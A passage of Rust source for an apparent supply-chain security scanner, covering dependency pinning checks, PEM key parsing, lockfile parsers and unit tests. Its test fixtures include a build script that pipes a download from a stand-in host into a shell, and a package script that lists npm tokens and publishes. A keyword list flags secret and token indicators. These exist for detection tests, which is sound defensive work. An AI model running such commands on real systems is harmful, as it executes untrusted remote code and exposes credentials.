        "cargo" | "cargo-declared" => "cargo",
        "npm" | "npm-declared" => "npm",
        "pypi" => "pypi",
        "go" => "golang",
        "nuget" => "nuget",
        "deb" => "deb/debian",
        "apk" => "apk/alpine",
        _ => return None,
    };
    Some(match version {
        Some(version) => format!("pkg:{ecosystem}/{name}@{version}"),
        None => format!("pkg:{ecosystem}/{name}"),
    })
}

fn is_npm_lifecycle_script(name: &str) -> bool {
    matches!(
        name,
        "preinstall"
            | "install"
            | "postinstall"
            | "prepublish"
            | "prepublishOnly"
            | "prepare"
            | "prepack"
            | "postpack"
            | "publish"
            | "postpublish"
    )
}

fn contains_secret_or_publish_indicator(command: &str) -> bool {
    let lower = command.to_ascii_lowercase();
    [
        "npm token",
        "npm publish",
        "_authtoken",
        "auth_token",
        "github_token",
        "gh_token",
        "gh auth",
        "api.github.com",
        "npmrc",
        "//registry.npmjs.org/:_authToken",
        "trufflehog",
        "gitleaks",
    ]
    .iter()
    .any(|needle| lower.contains(needle))
}

fn is_exact_version_spec(ecosystem: &str, spec: &str) -> bool {
    if ecosystem == "cargo" {
        return is_exact_cargo_version_spec(spec);
    }

    let spec = spec.trim().trim_start_matches('=').trim_start_matches('v');
    if spec.is_empty() {
        return false;
    }
    let lower = spec.to_ascii_lowercase();
    if lower == "latest"
        || lower == "*"
        || lower.contains('x')
        || lower.contains("||")
        || lower.contains(" - ")
        || lower.contains(' ')
        || lower.starts_with('^')
        || lower.starts_with('~')
        || lower.starts_with('>')
        || lower.starts_with('<')
        || lower.starts_with("http:")
        || lower.starts_with("https:")
        || lower.starts_with("git+")
        || lower.starts_with("file:")
        || lower.starts_with("link:")
        || lower.starts_with("workspace:")
        || lower.starts_with("npm:")
    {
        return false;
    }

    if semver::Version::parse(&lower).is_ok() {
        return true;
    }

    // Accept short MAJOR.MINOR forms (e.g. Cargo's "1.0") as exact by trying the
    // canonical extension to MAJOR.MINOR.0. Pure integers like "1" are still rejected
    // because they map to caret ranges in most ecosystems.
    if lower.chars().filter(|character| *character == '.').count() == 1
        && lower.split('.').all(|part| {
            !part.is_empty() && part.chars().all(|character| character.is_ascii_digit())
        })
    {
        return semver::Version::parse(&format!("{lower}.0")).is_ok();
    }

    false
}

fn is_exact_go_version(version: &str) -> bool {
    let Some(version) = version.strip_prefix('v') else {
        return false;
    };
    semver::Version::parse(version).is_ok()
}

fn is_exact_maven_version(version: &str) -> bool {
    let lower = version.trim().to_ascii_lowercase();
    !lower.is_empty()
        && !lower.contains("${")
        && !lower.contains("latest")
        && !lower.contains("release")
        && !lower.contains("snapshot")
        && !lower.contains('[')
        && !lower.contains(']')
        && !lower.contains('(')
        && !lower.contains(')')
        && !lower.contains(',')
        && !lower.contains('*')
}

fn is_exact_literal_version(version: &str) -> bool {
    let version = version.trim();
    !version.is_empty()
        && !version.chars().any(char::is_whitespace)
        && !version.contains('*')
        && !version.contains('[')
        && !version.contains(']')
        && !version.contains('(')
        && !version.contains(')')
        && !version.contains(',')
        && !version.starts_with(['<', '>', '~', '^'])
}

fn is_exact_cargo_version_spec(spec: &str) -> bool {
    exact_cargo_version_value(spec).is_some()
}

fn exact_cargo_version_value(spec: &str) -> Option<&str> {
    let version = spec.trim().strip_prefix('=')?;
    let version = version.trim().trim_start_matches('v');
    semver::Version::parse(version).is_ok().then_some(version)
}

fn parse_pem_blocks(path: &Path, evidence: &str, text: &str, scanner: &mut ScannerState) {
    let Ok(blocks) = pem::parse_many(text) else {
        return;
    };

    for block in blocks {
        let tag = block.tag().to_ascii_uppercase();
        if tag.contains("CERTIFICATE") {
            let parsed = x509_parser::parse_x509_certificate(block.contents()).is_ok();
            scanner.add_crypto(ScannedCryptoMaterial {
                name: path
                    .file_name()
                    .unwrap_or_default()
                    .to_string_lossy()
                    .to_string(),
                kind: if parsed {
                    "x509-certificate".to_string()
                } else {
                    "pem-certificate".to_string()
                },
                algorithm: None,
                purpose: Some("tls-or-signing-material".to_string()),
                evidence: evidence.to_string(),
            });
        } else if tag.contains("PRIVATE KEY") {
            scanner.add_crypto(ScannedCryptoMaterial {
                name: path
                    .file_name()
                    .unwrap_or_default()
                    .to_string_lossy()
                    .to_string(),
                kind: "parsed-private-key".to_string(),
                algorithm: None,
                purpose: Some("private-or-secret-key-material".to_string()),
                evidence: evidence.to_string(),
            });
            scanner.findings.push(ScanFinding {
                severity: FindingSeverity::High,
                category: "private-key-material".to_string(),
                message: "private key material was parsed from PEM content".to_string(),
                evidence: evidence.to_string(),
            });
        }
    }
}

fn xml_child_text(node: roxmltree::Node<'_, '_>, child_name: &str) -> Option<String> {
    node.children()
        .find(|child| child.has_tag_name(child_name))
        .and_then(|child| child.text())
        .map(str::trim)
        .filter(|value| !value.is_empty())
        .map(str::to_string)
}

fn yaml_child_mapping<'a>(
    value: &'a serde_yaml_ng::Value,
    key: &str,
) -> Option<&'a serde_yaml_ng::Mapping> {
    value
        .as_mapping()
        .and_then(|mapping| yaml_mapping_value(mapping, key))
        .and_then(serde_yaml_ng::Value::as_mapping)
}

fn yaml_child_str<'a>(value: &'a serde_yaml_ng::Value, key: &str) -> Option<&'a str> {
    value
        .as_mapping()
        .and_then(|mapping| yaml_mapping_str(mapping, key))
}

fn yaml_mapping_str<'a>(mapping: &'a serde_yaml_ng::Mapping, key: &str) -> Option<&'a str> {
    yaml_mapping_value(mapping, key).and_then(serde_yaml_ng::Value::as_str)
}

fn yaml_mapping_value<'a>(
    mapping: &'a serde_yaml_ng::Mapping,
    key: &str,
) -> Option<&'a serde_yaml_ng::Value> {
    mapping.get(serde_yaml_ng::Value::String(key.to_string()))
}

fn parse_pnpm_package_key(key: &str) -> Option<(String, Option<String>)> {
    let key = key.trim_start_matches('/');
    let key = key.split_once('(').map(|(value, _)| value).unwrap_or(key);
    let (name, version) = key.rsplit_once('@')?;
    if name.is_empty() {
        return None;
    }
    Some((name.to_string(), Some(version.to_string())))
}

fn contains_private_key_material(lower: &str) -> bool {
    lower.contains("-----begin private key-----")
        || lower.contains("-----begin rsa private key-----")
        || lower.contains("-----begin ec private key-----")
        || lower.contains("-----begin dsa private key-----")
        || lower.contains("-----begin openssh private key-----")
}

fn quoted_value<'a>(line: &'a str, key: &str) -> Option<&'a str> {
    let prefix = format!("{key} = \"");
    line.strip_prefix(&prefix)?.strip_suffix('"')
}

fn npm_name_from_package_path(path: &str) -> Option<String> {
    let parts = path.split("node_modules/").last()?;
    if parts.is_empty() {
        None
    } else {
        Some(parts.to_string())
    }
}

fn split_requirement(line: &str) -> (&str, Option<String>) {
    for delimiter in ["==", ">=", "<=", "~=", "!=", ">", "<"] {
        if let Some((name, version)) = line.split_once(delimiter) {
            return (name.trim(), Some(version.trim().to_string()));
        }
    }
    (line.trim(), None)
}

fn relative_evidence(root: &Path, path: &Path) -> String {
    path.strip_prefix(root)
        .unwrap_or(path)
        .display()
        .to_string()
        .replace('\\', "/")
}

fn is_known_metadata_file(path: &str, file_name: &str) -> bool {
    matches!(
        file_name,
        "Cargo.lock"
            | "Cargo.toml"
            | "package-lock.json"
            | "package.json"
            | "pnpm-lock.yaml"
            | "requirements.txt"
            | "go.mod"
            | "go.sum"
            | "pom.xml"
            | "packages.lock.json"
    ) || path.ends_with("var/lib/dpkg/status")
        || path.ends_with("lib/apk/db/installed")
}

fn looks_binary(bytes: &[u8]) -> bool {
    bytes.iter().take(1024).any(|byte| *byte == 0)
}

fn read_file_prefix(path: &Path, max: usize) -> anyhow::Result<Vec<u8>> {
    let mut file = fs::File::open(path)?;
    let mut prefix = vec![0_u8; max];
    let read = file.read(&mut prefix)?;
    prefix.truncate(read);
    Ok(prefix)
}

#[cfg(unix)]
fn is_executable(metadata: &fs::Metadata) -> bool {
    use std::os::unix::fs::PermissionsExt;
    metadata.permissions().mode() & 0o111 != 0
}

#[cfg(not(unix))]
fn is_executable(_metadata: &fs::Metadata) -> bool {
    false
}

#[derive(Default)]
struct ScannerState {
    files_scanned: usize,
    file_digests: BTreeMap<String, String>,
    file_metadata: BTreeMap<String, String>,
    go_requirements: BTreeSet<(String, String)>,
    go_checksums: BTreeSet<(String, String)>,
    components: BTreeMap<String, ScannedComponent>,
    crypto: BTreeMap<String, ScannedCryptoMaterial>,
    binaries: BTreeMap<String, BinaryAnalysis>,
    findings: Vec<ScanFinding>,
    vulnerability_assessments: BTreeMap<String, VulnerabilityAssessment>,
}

impl ScannerState {
    fn add_component(&mut self, component: ScannedComponent) {
        let key = format!(
            "{}|{}|{}",
            component.kind,
            component.name,
            component.version.clone().unwrap_or_default()
        );
        self.components.entry(key).or_insert(component);
    }

    fn add_crypto(&mut self, item: ScannedCryptoMaterial) {
        let key = format!("{}|{}|{}", item.kind, item.name, item.evidence);
        self.crypto.entry(key).or_insert(item);
    }

    fn add_binary(&mut self, item: BinaryAnalysis) {
        self.binaries.entry(item.path.clone()).or_insert(item);
    }

    fn add_vex_candidate(&mut self, candidate: VulnerabilityAssessment) {
        let key = format!(
            "{}|{}|{}",
            candidate.vulnerability, candidate.component, candidate.evidence
        );
        self.vulnerability_assessments
            .entry(key)
            .or_insert(candidate);
    }
}

#[cfg(test)]
mod tests {
    use std::{fs, os::unix::fs::PermissionsExt};

    use crate::models::{BuilderKind, BuilderRef, RecipeInput, SourceRef};

    use super::*;

    fn offline_scan_request() -> ScanRequest {
        ScanRequest {
            osv_mode: OsvMode::Disabled,
            ..Default::default()
        }
    }

    #[tokio::test]
    async fn scanner_detects_components_crypto_and_suspicious_scripts() {
        let temp = tempfile::tempdir().unwrap();
        fs::write(
            fs::canonicalize(temp.path())
                .unwrap()
                .as_path()
                .join("Cargo.lock"),
            r#"
[[package]]
name = "serde"
version = "1.0.0"
"#,
        )
        .unwrap();
        fs::write(
            fs::canonicalize(temp.path())
                .unwrap()
                .as_path()
                .join("tls.conf"),
            "min_protocol = TLSv1.0\n",
        )
        .unwrap();
        fs::write(
            fs::canonicalize(temp.path())
                .unwrap()
                .as_path()
                .join("build.sh"),
            "curl https://example.invalid/x | sh\n",
        )
        .unwrap();
        let binary = fs::canonicalize(temp.path())
            .unwrap()
            .as_path()
            .join("tool.bin");
        fs::write(&binary, [0_u8, 1, 2, 3]).unwrap();
        let mut permissions = fs::metadata(&binary).unwrap().permissions();
        permissions.set_mode(0o755);
        fs::set_permissions(&binary, permissions).unwrap();

        let recipe = Recipe::new(RecipeInput {
            name: "service".to_string(),
            source: SourceRef {
                repo: "https://example.invalid/service".to_string(),
                revision: "abc123".to_string(),
                path: Some(
                    fs::canonicalize(temp.path())
                        .unwrap()
                        .as_path()
                        .to_path_buf(),
                ),
            },
            builder: BuilderRef {
                kind: BuilderKind::Script,
                name: Some("local".to_string()),
                digest: Some("sha256:builder".to_string()),
            },
            build: Default::default(),
            materials: Vec::new(),
            crypto: Vec::new(),
            policy: Default::default(),
            annotations: Default::default(),
        })
        .unwrap();

        let report = scan_recipe(
            &recipe,
            offline_scan_request(),
            fs::canonicalize(temp.path()).unwrap().as_path(),
        )
        .await
        .unwrap();

        assert!(
            report
                .components
                .iter()
                .any(|component| component.name == "serde")
        );
        assert!(
            report
                .crypto
                .iter()
                .any(|item| item.algorithm.as_deref() == Some("TLS 1.0"))
        );
        assert!(
            report
                .findings
                .iter()
                .any(|finding| finding.category == "suspicious-build-behavior")
        );
        assert!(
            report
                .vulnerability_assessments
                .iter()
                .any(|candidate| candidate.vulnerability == "fulcr-ADHOC-BINARY")
        );
    }

    #[test]
    fn scanner_anchors_relative_request_path_under_work_dir() {
        let temp = tempfile::tempdir().unwrap();
        let work_dir = fs::canonicalize(temp.path()).unwrap();
        fs::create_dir_all(work_dir.join("checkout")).unwrap();
        fs::write(
            work_dir.join("checkout/package.json"),
            "{\"name\":\"service\"}\n",
        )
        .unwrap();
        let recipe = Recipe::new(RecipeInput {
            name: "service".to_string(),
            source: SourceRef {
                repo: "https://example.invalid/service".to_string(),
                revision: "0123456789abcdef0123456789abcdef01234567".to_string(),
                path: None,
            },
            builder: BuilderRef {
                kind: BuilderKind::Script,
                name: Some("local".to_string()),
                digest: Some(
                    "sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
                        .to_string(),
                ),
            },
            build: Default::default(),
            materials: Vec::new(),
            crypto: Vec::new(),
            policy: Default::default(),
            annotations: Default::default(),
        })
        .unwrap();

        let report = scan_recipe_blocking(
            &recipe,
            ScanRequest {
                mode: ScanMode::Source,
                path: Some(PathBuf::from("checkout")),
                max_file_bytes: None,
                osv_mode: OsvMode::Disabled,
            },
            &work_dir,
        )
        .unwrap();

        assert_eq!(report.root, work_dir.join("checkout"));
    }

    #[tokio::test]
    async fn scanner_reconstructs_docker_archive_rootfs() {
        let temp = tempfile::tempdir().unwrap();
        let image_dir = fs::canonicalize(temp.path())
            .unwrap()
            .as_path()
            .join("image");
        fs::create_dir_all(&image_dir).unwrap();

        let layer_path = image_dir.join("layer.tar");
        {
            let file = fs::File::create(&layer_path).unwrap();
            let mut archive = tar::Builder::new(file);
            let status = b"Package: bash\nVersion: 5.2\n\n";
            let mut header = tar::Header::new_gnu();
            header.set_path("var/lib/dpkg/status").unwrap();
            header.set_size(status.len() as u64);
            header.set_cksum();
            archive.append(&header, &status[..]).unwrap();
            archive.finish().unwrap();
        }
        let compressed_layer_path = image_dir.join("layer.tar.zst");
        let compressed_layer =
            zstd::stream::encode_all(fs::File::open(&layer_path).unwrap(), 0).unwrap();
        fs::write(&compressed_layer_path, compressed_layer).unwrap();

        let layer_diff_id = crate::digest::digest_bytes(&fs::read(&layer_path).unwrap());
        fs::write(
            image_dir.join("config.json"),
            serde_json::to_vec(&json!({
                "rootfs": { "diff_ids": [layer_diff_id] }
            }))
            .unwrap(),
        )
        .unwrap();
        fs::write(
            image_dir.join("manifest.json"),
            r#"[{"Config":"config.json","RepoTags":["service:test"],"Layers":["layer.tar.zst"]}]"#,
        )
        .unwrap();

        let image_archive = fs::canonicalize(temp.path())
            .unwrap()
            .as_path()
            .join("image.tar");
        {
            let file = fs::File::create(&image_archive).unwrap();
            let mut archive = tar::Builder::new(file);
            archive
                .append_path_with_name(image_dir.join("config.json"), "config.json")
                .unwrap();
            archive
                .append_path_with_name(image_dir.join("manifest.json"), "manifest.json")
                .unwrap();
            archive
                .append_path_with_name(image_dir.join("layer.tar.zst"), "layer.tar.zst")
                .unwrap();
            archive.finish().unwrap();
        }

        let recipe = Recipe::new(RecipeInput {
            name: "service".to_string(),
            source: SourceRef {
                repo: "https://example.invalid/service".to_string(),
                revision: "abc123".to_string(),
                path: Some(
                    fs::canonicalize(temp.path())
                        .unwrap()
                        .as_path()
                        .to_path_buf(),
                ),
            },
            builder: BuilderRef {
                kind: BuilderKind::Script,
                name: Some("local".to_string()),
                digest: Some("sha256:builder".to_string()),
            },
            build: Default::default(),
            materials: Vec::new(),
            crypto: Vec::new(),
            policy: Default::default(),
            annotations: Default::default(),
        })
        .unwrap();

        let report = scan_recipe(
            &recipe,
            ScanRequest {
                mode: ScanMode::ImageArchive,
                path: Some(image_archive.clone()),
                max_file_bytes: None,
                osv_mode: OsvMode::Disabled,
            },
            fs::canonicalize(temp.path()).unwrap().as_path(),
        )
        .await
        .unwrap();

        assert!(matches!(report.mode, ScanMode::ImageArchive));
        assert_eq!(report.image.unwrap().kind, "docker-archive");
        assert!(
            report
                .components
                .iter()
                .any(|component| component.name == "bash" && component.kind == "deb")
        );
    }

    #[tokio::test]
    async fn scanner_flags_oversized_executable_before_size_skip() {
        let temp = tempfile::tempdir().unwrap();
        let binary = fs::canonicalize(temp.path())
            .unwrap()
            .as_path()
            .join("large-tool");
        fs::write(&binary, b"\x7fELF\0oversized fixture").unwrap();
        let mut permissions = fs::metadata(&binary).unwrap().permissions();
        permissions.set_mode(0o755);
        fs::set_permissions(&binary, permissions).unwrap();

        let recipe = Recipe::new(RecipeInput {
            name: "service".to_string(),
            source: SourceRef {
                repo: "https://example.invalid/service".to_string(),
                revision: "abc123".to_string(),
                path: Some(
                    fs::canonicalize(temp.path())
                        .unwrap()
                        .as_path()
                        .to_path_buf(),
                ),
            },
            builder: BuilderRef {
                kind: BuilderKind::Script,
                name: Some("local".to_string()),
                digest: Some("sha256:builder".to_string()),
            },
            build: Default::default(),
            materials: Vec::new(),
            crypto: Vec::new(),
            policy: Default::default(),
            annotations: Default::default(),
        })
        .unwrap();

        let report = scan_recipe(
            &recipe,
            ScanRequest {
                mode: ScanMode::Source,
                path: None,
                max_file_bytes: Some(4),
                osv_mode: OsvMode::Disabled,
            },
            fs::canonicalize(temp.path()).unwrap().as_path(),
        )
        .await
        .unwrap();

        assert!(
            report
                .findings
                .iter()
                .any(|finding| finding.category == "ad-hoc-binary")
        );
        assert!(
            report
                .vulnerability_assessments
                .iter()
                .any(|candidate| candidate.vulnerability == "fulcr-ADHOC-BINARY")
        );
    }

    #[tokio::test]
    async fn scanner_enforces_sbom_and_cbom_posture_controls() {
        let temp = tempfile::tempdir().unwrap();
        fs::write(
            fs::canonicalize(temp.path())
                .unwrap()
                .as_path()
                .join("package.json"),
            r#"{
  "dependencies": {
    "left-pad": "^1.3.0",
    "remote-tool": "https://example.invalid/remote-tool.tgz"
  },
  "scripts": {
    "postinstall": "node postinstall.js",
    "release": "npm token list && npm publish"
  }
}"#,
        )
        .unwrap();
        fs::write(
            fs::canonicalize(temp.path())
                .unwrap()
                .as_path()
                .join("package-lock.json"),
            r#"{
  "lockfileVersion": 3,
  "packages": {
    "node_modules/left-pad": {
      "name": "left-pad",
      "version": "1.3.0",
      "resolved": "http://registry.example.invalid/left-pad/-/left-pad-1.3.0.tgz",
      "hasInstallScript": true
    }
  }
}"#,
        )
        .unwrap();
        fs::write(
            fs::canonicalize(temp.path())
                .unwrap()
                .as_path()
                .join("crypto.conf"),
            "openssl 1.1.1\nkeysize=1024\n-----BEGIN PRIVATE KEY-----\n",
        )
        .unwrap();

        let recipe = Recipe::new(RecipeInput {
            name: "service".to_string(),
            source: SourceRef {
                repo: "https://example.invalid/service".to_string(),
                revision: "abc123".to_string(),
                path: Some(
                    fs::canonicalize(temp.path())
                        .unwrap()
                        .as_path()
                        .to_path_buf(),
                ),
            },
            builder: BuilderRef {
                kind: BuilderKind::Script,
                name: Some("local".to_string()),
                digest: Some("sha256:builder".to_string()),
            },
            build: Default::default(),
            materials: Vec::new(),
            crypto: Vec::new(),
            policy: Default::default(),
            annotations: Default::default(),
        })
        .unwrap();

        let report = scan_recipe(
            &recipe,
            offline_scan_request(),
            fs::canonicalize(temp.path()).unwrap().as_path(),
        )
        .await
        .unwrap();
        for category in [
            "sbom-unpinned-dependency",
            "sbom-untrusted-source",
            "sbom-lifecycle-script",
            "sbom-missing-integrity",
            "sbom-suspicious-package-script",
            "private-key-material",
            "crypto-policy-drift",
        ] {
            assert!(
                report
                    .findings
                    .iter()
                    .any(|finding| finding.category == category),
                "missing finding category {category}"
            );
        }
        assert!(
            report.sbom["fulcrPolicyFindings"]
                .as_array()
                .is_some_and(|findings| !findings.is_empty())
        );
        assert!(
            report.cbom["findings"]
                .as_array()
                .is_some_and(|findings| !findings.is_empty())
        );
    }

    #[tokio::test]
    async fn scanner_uses_specialized_rust_manifest_and_pem_parsers() {
        let temp = tempfile::tempdir().unwrap();
        fs::write(
            fs::canonicalize(temp.path())
                .unwrap()
                .as_path()
                .join("Cargo.toml"),
            r#"
[package]
name = "service"
version = "1.0.0"

[dependencies]
serde = "1.0.228"
remote-tool = { git = "https://example.invalid/remote-tool.git" }
"#,
        )
        .unwrap();
        fs::write(
            fs::canonicalize(temp.path())
                .unwrap()
                .as_path()
                .join("pnpm-lock.yaml"),
            r#"
lockfileVersion: '9.0'
importers:
  .:
    dependencies:
      left-pad:
        specifier: 1.3.0
        version: 1.3.0
packages:
  /left-pad@1.3.0:
    resolution:
      integrity: sha512-left-pad-fixture
  /missing-integrity@1.0.0:
    resolution: {}
"#,
        )
        .unwrap();
        fs::write(
            fs::canonicalize(temp.path())
                .unwrap()
                .as_path()
                .join("pom.xml"),
            r#"
<project>
  <modelVersion>4.0.0</modelVersion>
  <groupId>dev.fulcr</groupId>
  <artifactId>service</artifactId>
  <version>1.0.0</version>
  <dependencies>
    <dependency>
      <groupId>org.slf4j</groupId>
      <artifactId>slf4j-api</artifactId>
      <version>${slf4j.version}</version>
    </dependency>
  </dependencies>
</project>
"#,
        )
        .unwrap();
        fs::write(
            fs::canonicalize(temp.path())
                .unwrap()
                .as_path()
                .join("developer.key"),
            "-----BEGIN PRIVATE KEY-----\nAQID\n-----END PRIVATE KEY-----\n",
        )
        .unwrap();

        let recipe = Recipe::new(RecipeInput {
            name: "service".to_string(),
            source: SourceRef {
                repo: "https://example.invalid/service".to_string(),
                revision: "abc123".to_string(),
                path: Some(
                    fs::canonicalize(temp.path())
                        .unwrap()
                        .as_path()
                        .to_path_buf(),
                ),
            },
            builder: BuilderRef {
                kind: BuilderKind::Script,
                name: Some("local".to_string()),
                digest: Some("sha256:builder".to_string()),
            },
            build: Default::default(),
            materials: Vec::new(),
            crypto: Vec::new(),
            policy: Default::default(),
            annotations: Default::default(),
        })
        .unwrap();

        let report = scan_recipe(
            &recipe,
            offline_scan_request(),
            fs::canonicalize(temp.path()).unwrap().as_path(),
        )
        .await
        .unwrap();

        assert!(
            report.components.iter().any(|component| {
                component.kind == "cargo-declared" && component.name == "serde"
            })
        );
        assert!(
            report
                .components
                .iter()
                .any(|component| component.kind == "npm" && component.name == "left-pad")
        );
        assert!(report.components.iter().any(|component| {
            component.kind == "maven" && component.name == "org.slf4j:slf4j-api"
        }));
        assert!(
            report
                .crypto
                .iter()
                .any(|item| item.kind == "parsed-private-key")
        );
        assert!(
            report
                .findings
                .iter()
                .any(|finding| finding.category == "sbom-untrusted-source")
        );
        assert!(
            report
                .findings
                .iter()
                .any(|finding| finding.category == "sbom-missing-integrity")
        );
    }

    #[test]
    fn cargo_bare_semver_is_not_exact_pin() {
        assert!(!is_exact_version_spec("cargo", "1.0.228"));
        assert!(!is_exact_version_spec("cargo", "^1.0.228"));
        assert!(is_exact_version_spec("cargo", "=1.0.228"));
        assert!(is_exact_version_spec("npm", "1.0.228"));
    }

    #[test]
    fn cargo_declared_purl_uses_only_exact_version_value() {
        assert_eq!(
            package_url("cargo-declared", "serde", Some("=1.0.228")),
            Some("pkg:cargo/serde@1.0.228".to_string())
        );
        assert_eq!(
            package_url("cargo-declared", "serde", Some("1.0.228")),
            Some("pkg:cargo/serde".to_string())
        );
    }

    #[test]
    fn go_modules_require_exact_versions_and_checksums() {
        let mut scanner = ScannerState::default();
        parse_go_mod(
            "module example.invalid/service\nrequire example.invalid/dependency v1.2.3\n",
            "go.mod",
            &mut scanner,
        );
        compare_recipe_metadata(&test_recipe(), &mut scanner, true);

        assert!(
            scanner
                .components
                .values()
                .any(|component| component.name == "example.invalid/dependency")
        );
        assert!(
            scanner
                .findings
                .iter()
                .any(|finding| finding.category == "sbom-missing-integrity")
        );
    }

    #[test]
    fn nuget_lock_requires_resolved_version_and_content_hash() {
        let mut scanner = ScannerState::default();
        parse_nuget_lock(
            r#"{
  "dependencies": {
    "net8.0": {
      "Safe.Package": { "resolved": "1.2.3", "contentHash": "sha512-fixture" },
      "Unsafe.Package": { "resolved": "[1.0,2.0)" }
    }
  }
}"#,
            "packages.lock.json",
            &mut scanner,
        );

        assert!(
            scanner
                .components
                .values()
                .any(|component| { component.kind == "nuget" && component.name == "Safe.Package" })
        );
        assert!(scanner.findings.iter().any(|finding| {
            finding.category == "sbom-missing-integrity"
                && finding.message.contains("Unsafe.Package")
        }));
        assert!(scanner.findings.iter().any(|finding| {
            finding.category == "sbom-unpinned-dependency"
                && finding.message.contains("Unsafe.Package")
        }));
    }

    #[test]
    fn multiline_python_hashes_satisfy_integrity_policy() {
        let mut scanner = ScannerState::default();
        parse_requirements(
            concat!(
                "requests==2.32.0 \\\n",
                "    --hash=sha256:first \\\n",
                "    --hash=sha256:second\n"
            ),
            "requirements.txt",
            &mut scanner,
        );

        assert!(
            scanner
                .components
                .values()
                .any(|component| component.name == "requests")
        );
        assert!(
            !scanner
                .findings
                .iter()
                .any(|finding| finding.category == "sbom-missing-integrity")
        );
    }

    #[test]
    fn declared_file_material_digest_must_match_scanned_bytes() {
        let temp = tempfile::tempdir().unwrap();
        let work_dir = fs::canonicalize(temp.path()).unwrap();
        let bytes = b"trusted material";
        fs::write(work_dir.join("material.txt"), bytes).unwrap();
        let mut recipe = test_recipe();
        recipe.source.path = Some(work_dir.clone());
        recipe.materials.push(crate::models::Material {
            name: "material.txt".to_string(),
            digest: crate::digest::digest_bytes(bytes),
            kind: Some("source-file".to_string()),
            version: None,
        });

        let matching = scan_recipe_blocking(&recipe, offline_scan_request(), &work_dir).unwrap();
        assert!(!matching.findings.iter().any(|finding| {
            finding.category == "metadata-misalignment"
                && finding.message.contains("digest does not match")
        }));

        recipe.materials[0].digest = format!("sha256:{}", "0".repeat(64));
        let mismatched = scan_recipe_blocking(&recipe, offline_scan_request(), &work_dir).unwrap();
        assert!(mismatched.findings.iter().any(|finding| {
            finding.severity == FindingSeverity::High
                && finding.category == "metadata-misalignment"
                && finding.message.contains("digest does not match")
        }));
    }

    #[test]
    fn autonomous_vex_does_not_treat_inventory_absence_as_not_affected() {
        let recipe = test_recipe();
        let source_component = ScannedComponent {
            name: "vulnerable-lib".to_string(),
            version: Some("1.0.0".to_string()),
            kind: "cargo".to_string(),
            purl: Some("pkg:cargo/vulnerable-lib@1.0.0".to_string()),
            digest: None,
            evidence: "Cargo.lock".to_string(),
        };
        let source = vulnerability_report(&recipe, ScanMode::Source, source_component, true);
        let mut artifact = empty_assessment_report(&recipe, ScanMode::Filesystem, true);

        apply_autonomous_vex_assessments(&source, &mut artifact);

        assert!(artifact.vulnerability_assessments.iter().any(|assessment| {
            assessment.vulnerability == "CVE-2026-0001"
                && assessment.status == VexStatus::UnderInvestigation
                && assessment.justification == "component_absence_unproven"
        }));
    }

    #[test]
    fn autonomous_vex_marks_clean_changed_version_fixed() {
        let recipe = test_recipe();
        let source_component = ScannedComponent {
            name: "vulnerable-lib".to_string(),
            version: Some("1.0.0".to_string()),
            kind: "npm".to_string(),
            purl: Some("pkg:npm/vulnerable-lib@1.0.0".to_string()),
            digest: None,
            evidence: "package-lock.json".to_string(),
        };
        let source = vulnerability_report(&recipe, ScanMode::Source, source_component, true);
        let mut artifact = empty_assessment_report(&recipe, ScanMode::Filesystem, true);
        artifact.components.push(ScannedComponent {
            name: "vulnerable-lib".to_string(),
            version: Some("1.0.1".to_string()),
            kind: "npm".to_string(),
            purl: Some("pkg:npm/vulnerable-lib@1.0.1".to_string()),
            digest: None,
            evidence: "rootfs/package-lock.json".to_string(),
        });

        apply_autonomous_vex_assessments(&source, &mut artifact);

        assert!(artifact.vulnerability_assessments.iter().any(|assessment| {
            assessment.status == VexStatus::Fixed
                && assessment.justification == "component_fixed_version"
        }));
    }

    #[test]
    fn autonomous_vex_keeps_present_component_inconclusive_without_clean_osv() {
        let recipe = test_recipe();
        let source_component = ScannedComponent {
            name: "vulnerable-lib".to_string(),
            version: Some("1.0.0".to_string()),
            kind: "cargo".to_string(),
            purl: None,
            digest: None,
            evidence: "Cargo.lock".to_string(),
        };
        let source =
            vulnerability_report(&recipe, ScanMode::Source, source_component.clone(), true);
        let mut artifact = empty_assessment_report(&recipe, ScanMode::Filesystem, false);
        artifact.components.push(source_component);

        apply_autonomous_vex_assessments(&source, &mut artifact);

        assert!(artifact.vulnerability_assessments.iter().any(|assessment| {
            assessment.status == VexStatus::UnderInvestigation
                && assessment.justification == "artifact_exploitability_inconclusive"
        }));
    }

    fn vulnerability_report(
        recipe: &Recipe,
        mode: ScanMode,
        component: ScannedComponent,
        osv_completed: bool,
    ) -> ScanReport {
        let mut report = empty_assessment_report(recipe, mode, osv_completed);
        report.findings.push(ScanFinding {
            severity: FindingSeverity::High,
            category: "known-vulnerability".to_string(),
            message: "component vulnerable-lib has a known vulnerability: CVE-2026-0001"
                .to_string(),
            evidence: component.evidence.clone(),
        });
        report
            .vulnerability_assessments
            .push(VulnerabilityAssessment {
                vulnerability: "CVE-2026-0001".to_string(),
                status: VexStatus::UnderInvestigation,
                component: component.name.clone(),
                justification: "artifact_assessment_required".to_string(),
                detail: "source match".to_string(),
                evidence: component.evidence.clone(),
            });
        report.components.push(component);
        report
    }

    fn empty_assessment_report(recipe: &Recipe, mode: ScanMode, osv_completed: bool) -> ScanReport {
        ScanReport {
            id: Uuid::new_v4(),
            recipe_id: recipe.id,
            recipe_digest: recipe.digest.clone(),
            created_at: timestamp(),
            scanner: "test".to_string(),
            filesystem_digest: None,
            declared_artifact_digest: None,
            mode,
            root: PathBuf::from("rootfs"),
            image: None,
            status: ScanStatus::Completed,
            summary: ScanSummary::default(),
            components: Vec::new(),
            crypto: Vec::new(),
            binaries: Vec::new(),
            findings: Vec::new(),
            vulnerability_assessments: Vec::new(),
            sbom: json!({
                "properties": [{
                    "name": "fulcr:osv-status",
                    "value": if osv_completed { "completed" } else { "failed" }
                }]
            }),
            cbom: json!({}),
        }
    }

    fn test_recipe() -> Recipe {
        Recipe::new(RecipeInput {
            name: "service".to_string(),
            source: SourceRef {
                repo: "https://example.invalid/service".to_string(),
                revision: "0123456789abcdef0123456789abcdef01234567".to_string(),
                path: None,
            },
            builder: BuilderRef {
                kind: BuilderKind::Script,
                name: Some("local".to_string()),
                digest: Some(
                    "sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
                        .to_string(),
                ),
            },
            build: Default::default(),
            materials: Vec::new(),
            crypto: Vec::new(),
            policy: Default::default(),
            annotations: Default::default(),
        })
        .unwrap()
    }

    #[test]
    fn scanner_does_not_honor_repository_ignore_rules() {
        let temp = tempfile::tempdir().unwrap();
